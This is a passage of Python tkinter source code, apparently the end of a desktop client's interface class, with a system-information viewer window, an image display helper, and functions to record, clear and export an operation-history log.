                viewer = tk.Toplevel(self)
                viewer.title("System Information")
                viewer.geometry("600x500")
                viewer.configure(bg=COLORS['bg_dark'])

                text = scrolledtext.ScrolledText(viewer, bg='black', fg=COLORS['fg_secondary'],
                                                font=FONTS['mono'])
                text.pack(fill='both', expand=True, padx=10, pady=10)
                text.insert(tk.END, formatted)

                self.add_history("System Info", "Retrieved full system info", "Success")
        threading.Thread(target=_thread, daemon=True).start()

    def _show_image(self, img_data, title="Image"):
        """显示图片"""
        top = tk.Toplevel(self)
        top.title(title)
        top.configure(bg='black')

        img = Image.open(io.BytesIO(img_data))
        img.thumbnail((1280, 720))
        photo = ImageTk.PhotoImage(img)

        lbl = tk.Label(top, image=photo, bg='black')
        lbl.image = photo
        lbl.pack()

    # ==================== 操作历史功能 ====================

    def add_history(self, action, details, status):
        """添加操作历史记录"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.history_tree.insert('', 0, values=(timestamp, action, details, status))

    def clear_history(self):
        """清空历史记录"""
        if messagebox.askyesno("Confirm", "Clear all history?"):
            for item in self.history_tree.get_children():
                self.history_tree.delete(item)

    def export_history(self):
        """导出历史记录"""
        save_path = filedialog.asksaveasfilename(defaultextension=".txt",
                                                filetypes=[("Text files", "*.txt"), ("CSV files", "*.csv")])
        if save_path:
            with open(save_path, 'w') as f:
                f.write("Operation History Export\n")
                f.write("="*80 + "\n\n")
                for item in self.history_tree.get_children():
                    values = self.history_tree.item(item)['values']
                    f.write(f"{values[0]} | {values[1]} | {values[2]} | {values[3]}\n")
            messagebox.showinfo("Success", f"History exported to {save_path}")


if __name__ == "__main__":
    app = VisualClientUI()
    app.mainloop()
